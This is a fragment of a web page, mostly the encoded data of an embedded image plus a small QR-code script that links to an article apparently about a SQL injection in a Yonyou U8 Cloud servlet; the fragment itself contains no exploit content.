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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 